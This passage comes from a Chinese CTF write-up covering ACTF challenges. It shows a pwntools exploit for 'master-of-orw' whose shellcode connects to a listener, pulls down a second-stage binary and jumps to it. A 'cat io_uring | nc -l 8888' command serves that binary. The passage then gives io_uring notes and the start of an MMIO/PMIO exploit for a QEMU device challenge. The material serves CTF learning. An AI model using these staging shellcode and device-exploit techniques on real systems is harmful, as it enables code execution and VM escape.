class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_binary</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address info starting in %p:\n&quot;</span>, buf);<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> output_buffer[<span class="hljs-number">80</span>];<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(length % <span class="hljs-number">16</span> == <span class="hljs-number">0</span> ? length / <span class="hljs-number">16</span> : length / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>); i++)&#123;<br>        <span class="hljs-type">char</span> temp_buffer[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-built_in">memset</span>(temp_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">sprintf</span>(temp_buffer, <span class="hljs-string">&quot;%#5x&quot;</span>, index);<br>        <span class="hljs-built_in">strcpy</span>(output_buffer, temp_buffer);<br>        output_buffer[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">16</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(index+j &gt;= length)<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;%02x &quot;</span>, ((<span class="hljs-type">int</span>)buf[index+j]) &amp; <span class="hljs-number">0xFF</span>);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprint</span>(buf[index+j]))<br>                    output_buffer[<span class="hljs-number">58</span>+j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                <span class="hljs-keyword">else</span><br>                    output_buffer[<span class="hljs-number">58</span>+j] = buf[index+j];<br>            &#125;<br>        &#125;<br>        output_buffer[<span class="hljs-number">55</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">56</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">57</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output_buffer);<br>        <span class="hljs-built_in">memset</span>(output_buffer+<span class="hljs-number">58</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">16</span>);<br>        index += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> *<span class="hljs-title">serv_addr</span> =</span> <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in));<br>    <span class="hljs-built_in">memset</span>(serv_addr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in));<br>    serv_addr-&gt;sin_family = AF_INET;<br>    serv_addr-&gt;sin_addr.s_addr = inet_addr(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<br>    serv_addr-&gt;sin_port = htons(<span class="hljs-number">8888</span>);<br>    print_binary(serv_addr,<span class="hljs-number">16</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在终端开</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cat io_uring <span class="hljs-string">| nc -l 8888</span><br></code></pre></td></tr></table></figure><p>再执行exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> ctypes<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;43.132.193.22&#x27;</span>, <span class="hljs-number">9998</span>)<br><span class="hljs-keyword">else</span>:<br>    r = process(<span class="hljs-string">&#x27;./master-of-orw&#x27;</span>)<br>    p = process(<span class="hljs-string">&quot;./master-of-orw&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>socket_struct = <span class="hljs-number">0x020022b87f000001</span><br>asm_socket = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rax, 41</span><br><span class="hljs-string">mov rdi, 2</span><br><span class="hljs-string">mov rsi, 1</span><br><span class="hljs-string">xor rdx, rdx</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>push_socket_struct = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov r15, 0x0100007fb8220002</span><br><span class="hljs-string">push r15</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>asm_connect = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rsi, rsp</span><br><span class="hljs-string">mov rdi, 3</span><br><span class="hljs-string">mov rdx, 0x10</span><br><span class="hljs-string">mov rax, 42</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>cyc_recv = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rsi, 0x400000</span><br><span class="hljs-string">mov r14, 0xcfcc8</span><br><span class="hljs-string"></span><br><span class="hljs-string">again:</span><br><span class="hljs-string">mov edi, 3</span><br><span class="hljs-string">mov rdx, 0x1000</span><br><span class="hljs-string">mov r10d, 0</span><br><span class="hljs-string">xor r8d, r8d</span><br><span class="hljs-string">xor r9d, r9d</span><br><span class="hljs-string">mov eax, 45 ;// recvfrom</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">add rsi, rax</span><br><span class="hljs-string">sub r14, rax</span><br><span class="hljs-string">cmp r14,0</span><br><span class="hljs-string">jge again</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x401620</span><br><span class="hljs-string">ret</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode = asm(shellcraft.mmap(<span class="hljs-number">0x400000</span>,<span class="hljs-number">0x100000</span>,<span class="hljs-number">7</span>,<span class="hljs-number">33</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)) + \<br>            asm(asm_socket) + asm(push_socket_struct) + asm(asm_connect) + \<br>            asm(cyc_recv)<br><br><br><br>sl(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/img/ACTF/7.png" alt="img"></p><h3 id="题目之外–about-io-uring"><a href="#题目之外–about-io-uring" class="headerlink" title="题目之外–about io_uring"></a>题目之外–about io_uring</h3><p>源码康<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/uapi/linux/io_uring.h">这里</a></p><p>io_uring_op还挺丰富</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">io_uring_op</span> &#123;</span><br>IORING_OP_NOP,<br>IORING_OP_READV,<br>IORING_OP_WRITEV,<br>IORING_OP_FSYNC,<br>IORING_OP_READ_FIXED,<br>IORING_OP_WRITE_FIXED,<br>IORING_OP_POLL_ADD,<br>IORING_OP_POLL_REMOVE,<br>IORING_OP_SYNC_FILE_RANGE,<br>IORING_OP_SENDMSG,<br>IORING_OP_RECVMSG,<br>IORING_OP_TIMEOUT,<br>IORING_OP_TIMEOUT_REMOVE,<br>IORING_OP_ACCEPT,<br>IORING_OP_ASYNC_CANCEL,<br>IORING_OP_LINK_TIMEOUT,<br>IORING_OP_CONNECT,<br>IORING_OP_FALLOCATE,<br>IORING_OP_OPENAT,<br>IORING_OP_CLOSE,<br>IORING_OP_FILES_UPDATE,<br>IORING_OP_STATX,<br>IORING_OP_READ,<br>IORING_OP_WRITE,<br>IORING_OP_FADVISE,<br>IORING_OP_MADVISE,<br>IORING_OP_SEND,<br>IORING_OP_RECV,<br>IORING_OP_OPENAT2,<br>IORING_OP_EPOLL_CTL,<br>IORING_OP_SPLICE,<br>IORING_OP_PROVIDE_BUFFERS,<br>IORING_OP_REMOVE_BUFFERS,<br>IORING_OP_TEE,<br>IORING_OP_SHUTDOWN,<br>IORING_OP_RENAMEAT,<br>IORING_OP_UNLINKAT,<br>IORING_OP_MKDIRAT,<br>IORING_OP_SYMLINKAT,<br>IORING_OP_LINKAT,<br>IORING_OP_MSG_RING,<br>IORING_OP_FSETXATTR,<br>IORING_OP_SETXATTR,<br>IORING_OP_FGETXATTR,<br>IORING_OP_GETXATTR,<br>IORING_OP_SOCKET,<br>IORING_OP_URING_CMD,<br>IORING_OP_SEND_ZC,<br>IORING_OP_SENDMSG_ZC,<br><br><span class="hljs-comment">/* this goes last, obviously */</span><br>IORING_OP_LAST,<br>&#125;;<br></code></pre></td></tr></table></figure><p>找到了偏移量的设置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_SQ_RING0ULL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_CQ_RING0x8000000ULL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_SQES0x10000000ULL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_PBUF_RING0x80000000ULL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_PBUF_SHIFT16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_MMAP_MASK0xf8000000ULL</span><br><br>IORING_OFF_SQ_RING：这是用于访问 Submission Queue Ring（SQ Ring）的偏移量。SQ Ring 用于存储I/O请求的提交队列<br><br>IORING_OFF_SQES：这是用于访问 Submission Queue Entry（SQE）的偏移量。SQE 是I/O请求的数据结构，用于描述I/O操作的各个参数。<br></code></pre></td></tr></table></figure><p>也就解释了为什么对应第一个mmap的offset&#x3D;0，第二个mmap的offset&#x3D;0x10000000</p><h2 id="qemu-playground"><a href="#qemu-playground" class="headerlink" title="qemu-playground"></a>qemu-playground</h2><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>👴先声明，这是👴人生中第一个逆向题，👴连那个核心算法都没看明白。👴输入了原始数据试一下，再把得到的数据输进去，然后，就没有然后了，👴就拿到了flag</p><p><img src="/img/ACTF/8.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-comment">// #define PAGE_SHIFT 12</span><br><span class="hljs-comment">// #define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT) // 4096</span><br><span class="hljs-comment">// #define PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-comment">// #define PFN_PFN ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-comment">// #define PMIO_BASE 0x000000000000c000</span><br><span class="hljs-comment">// #define CSR(_x) ((_x) &lt;&lt; 3)</span><br><span class="hljs-comment">// #define CSR5_TS_SUSPENDED 6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMIO_BASE 0XC040</span><br><br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* mmio_mem;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_binary</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address info starting in %p:\n&quot;</span>, buf);<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> output_buffer[<span class="hljs-number">80</span>];<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(length % <span class="hljs-number">16</span> == <span class="hljs-number">0</span> ? length / <span class="hljs-number">16</span> : length / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>); i++)&#123;<br>        <span class="hljs-type">char</span> temp_buffer[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-built_in">memset</span>(temp_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">sprintf</span>(temp_buffer, <span class="hljs-string">&quot;%#5x&quot;</span>, index);<br>        <span class="hljs-built_in">strcpy</span>(output_buffer, temp_buffer);<br>        output_buffer[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">16</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(index+j &gt;= length)<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;%02x &quot;</span>, ((<span class="hljs-type">int</span>)buf[index+j]) &amp; <span class="hljs-number">0xFF</span>);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprint</span>(buf[index+j]))<br>                    output_buffer[<span class="hljs-number">58</span>+j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                <span class="hljs-keyword">else</span><br>                    output_buffer[<span class="hljs-number">58</span>+j] = buf[index+j];<br>            &#125;<br>        &#125;<br>        output_buffer[<span class="hljs-number">55</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">56</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">57</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output_buffer);<br>        <span class="hljs-built_in">memset</span>(output_buffer+<span class="hljs-number">58</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">16</span>);<br>        index += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> *((<span class="hljs-type">uint64_t</span> *)(mmio_mem + addr));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span><br>&#123;<br>    *((<span class="hljs-type">uint32_t</span>*)(mmio_mem + addr)) = value;<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">pmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> value)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> inl(PMIO_BASE + value);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span><br>&#123;<br>    outb(value,PMIO_BASE+addr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_value</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr, <span class="hljs-type">uint64_t</span> value)</span><br>&#123;<br>    mmio_write(addr,value&amp;<span class="hljs-number">0xffffffff</span>);<br>    mmio_write(addr+<span class="hljs-number">4</span>,value&gt;&gt;<span class="hljs-number">32</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,O_SYNC|O_RDWR);<br>    <span class="hljs-keyword">if</span> (mmio_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;open mmio device failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    mmio_mem = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (mmio_mem == MAP_FAILED)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;get mmio_mem failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);<br><br>    <span class="hljs-keyword">if</span> (iopl(<span class="hljs-number">3</span>)!=<span class="hljs-number">0</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;open pmio device failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br><span class="hljs-comment">// 00:0000│ rbx 0x56043c8e1fa8 ◂— 0xaba29ec2a98dd89a                                                     </span><br><span class="hljs-comment">// 01:0008│     0x56043c8e1fb0 ◂— 0xbbf1b4ab81b4a9d4                                                     </span><br><span class="hljs-comment">// 02:0010│     0x56043c8e1fb8 ◂— 0xfb92a48db386ffa8                                                     </span><br><span class="hljs-comment">// 03:0018│     0x56043c8e1fc0 ◂— 0xefb491b8afb4abd3                                                     </span><br><span class="hljs-comment">// 04:0020│ r11 0x56043c8e1fc8 ◂— 0x80ef69f1cbd00397                                                    </span><br><span class="hljs-comment">// 05:0028│     0x56043c8e1fd0 ◂— 0xb2eb07859cda52d3                                                     </span><br><span class="hljs-comment">// 06:0030│     0x56043c8e1fd8 ◂— 0xec9e22f5a5a07fa3                                                 </span><br><span class="hljs-comment">// 07:0038│     0x56043c8e1fe0 ◂— 0x4b36df7b5b655a84 </span><br><br><span class="hljs-comment">// 00:0000│ rbx 0x559cbeef0fa8 ◂— 0x7a1299023d29ff68                                                     </span><br><span class="hljs-comment">// 01:0008│     0x559cbeef0fb0 ◂— 0x702edf5e423bb634                                                     </span><br><span class="hljs-comment">// 02:0010│     0x559cbeef0fb8 ◂— 0x2653e2366369b36c                                                     </span><br><span class="hljs-comment">// 03:0018│     0x559cbeef0fc0 ◂— 0xd9a33790b594ae73                                                     